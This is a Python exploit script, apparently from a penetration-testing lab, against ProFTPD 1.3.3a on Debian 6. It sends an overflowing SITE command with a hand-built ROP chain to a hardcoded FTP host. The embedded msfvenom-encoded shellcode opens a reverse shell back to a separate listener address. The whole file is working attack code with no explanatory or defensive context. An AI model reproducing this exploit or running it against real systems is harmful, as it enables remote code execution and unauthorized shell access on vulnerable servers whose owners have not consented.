#!/usr/bin/python
import socket
import struct

# msfvenom -a x86 -p linux/x86/shell_reverse_tcp LHOST=10.11.0.30 LPORT=53 -e x86/shikata_ga_nai -b "\x09\x0a\x0b\x0c\x0d\x20\xff" -f c
# Payload size: 95 bytes
shellcode = (
"\xbb\xb5\xe9\x9c\x45\xd9\xf7\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x12\x31\x5f\x12\x03\x5f\x12\x83\x72\xed\x7e\xb0\x4d\x35\x89"
"\xd8\xfe\x8a\x25\x75\x02\x84\x2b\x39\x64\x5b\x2b\xa9\x31\xd3"
"\x13\x03\x41\x5a\x15\x62\x29\x57\xee\x94\xb7\x0f\xf2\x94\xc7"
"\xfa\x7b\x75\x77\x62\x2c\x27\x24\xd8\xcf\x4e\x2b\xd3\x50\x02"
"\xc3\x82\x7f\xd0\x7b\x33\xaf\x39\x19\xaa\x26\xa6\x8f\x7f\xb0"
"\xc8\x9f\x8b\x0f\x8a"
)

# Debian 6 - ProFTPD 1.3.3a
ret = struct.pack('<L', 0x805a547) # pop esi / pop ebp / ret
writable = struct.pack('<L', 0x80e81a0) # .data
iaccount = 4096+16
offset = 0x102c-4
buffer = 'SITE ' + shellcode 
oddbyte = "\x41" if (len(buffer) % 2) == 0 else ""
buffer += oddbyte + "\xff"*(iaccount-len(shellcode)) 
padding = "\x41"*(offset-len(buffer))
buffer += padding + ret + writable
buffer += struct.pack('<L', 0xcccccccc) # unused
buffer += struct.pack('<L', 0x805a544) # mov eax,esi / pop ebx / pop esi / pop ebp / ret
buffer += struct.pack('<L', 0xcccccccc) # becomes ebx
buffer += struct.pack('<L', 0xcccccccc) # becomes esi
buffer += struct.pack('<L', 0xcccccccc) # becomes ebp
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x8068886) # mov eax,[eax] / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x805bd8e) # inc eax / adc cl, cl / ret
buffer += struct.pack('<L', 0x0805c26c) # jmp eax
buffer += "\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "Connecting.\n"
	s.connect(('10.11.1.146', 21))
	print "Sending buffer.\n"
	s.send(buffer)
	print "Done.\n"
except:
	print "Failed.\n"
